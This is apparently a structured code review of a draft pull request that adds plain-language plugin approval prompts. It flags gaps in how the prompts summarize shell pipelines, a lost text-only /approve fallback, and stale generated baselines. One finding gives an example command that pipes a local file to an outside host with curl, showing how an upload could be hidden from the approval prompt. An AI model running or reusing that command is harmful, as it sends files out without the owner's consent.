## Summary

Keep open. This draft PR has blocking approval-safety and fallback issues in the proposed simple renderer: ordinary pipelines can be under-summarized while raw command details are hidden, and text-only approval surfaces lose the manual approval command.

## What This Changes

The PR adds an opt-in `approvals.plugin.language` setting for plain-language plugin approval prompts and wires it through config, shared renderers, Telegram/Matrix/fallback forwarding, docs, and tests.

## Best Possible Solution

Land an opt-in simple approval mode only after the renderer fails closed for unsummarized shell pipelines, preserves an actionable text fallback, updates generated contract baselines, and gets visible Telegram/Matrix proof for the final prompt.

## Reproduction Assessment

Yes for the PR findings: source inspection shows simple mode returns before manual approval details, and the parser does not model ordinary pipeline stages before hiding the raw command. This is not a current-main bug reproduction because the PR adds a new opt-in mode.

## Solution Assessment

No as proposed. The default-preserving config direction is plausible, but the implementation needs safer shell summarization, a text-only approval path, and generated contract baseline updates before it is the maintainable fix.

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.88

Full review comments:

- **[P1] Fail closed on piped commands in simple approvals:** `src/infra/plugin-approvals.ts:233-236`
  - body: Simple mode hides the raw command, so the summary has to account for every shell step. `splitCommandSegments` ignores ordinary `|` pipelines except `| sh`, so a command like `cat notes.txt | curl -d @- https://example.test` can be summarized as a file read while the network upload disappears from the approval prompt. Parse pipeline stages or mark unsummarized pipelines high-risk before hiding the technical details.
  - confidence: 0.86
- **[P2] Keep text-only plugin approvals actionable:** `src/infra/plugin-approvals.ts:1134-1135`
  - body: When `language: "simple"` is selected, this return removes the request ID and `/approve` syntax. Forwarded approvals can still land on channels that ignore `interactive`, and the updated docs still promise a plain-text `/approve` fallback, so those users would see `Choose below` with no command they can use.
  - confidence: 0.88
- **[P3] Refresh the plugin SDK API baseline:** `src/plugin-sdk/approval-runtime.ts:44-45`
  - body: Exporting `resolvePluginApprovalLanguage` and `PluginApprovalLanguage` changes the public `plugin-sdk/approval-runtime` surface, but the PR does not update `docs/.generated/plugin-sdk-api-baseline.sha256`. The repo’s API baseline guard is meant to fail on that drift until the generated hash is refreshed.
  - confidence: 0.8
- **[P3] Refresh the config docs baseline:** `src/config/zod-schema.approvals.ts:25-27`
  - body: Adding `approvals.plugin.language` to the config schema changes the generated config reference surface, but the PR does not update `docs/.generated/config-baseline.sha256`. Refresh the generated config baseline so the checked contract matches the new option.
  - confidence: 0.74
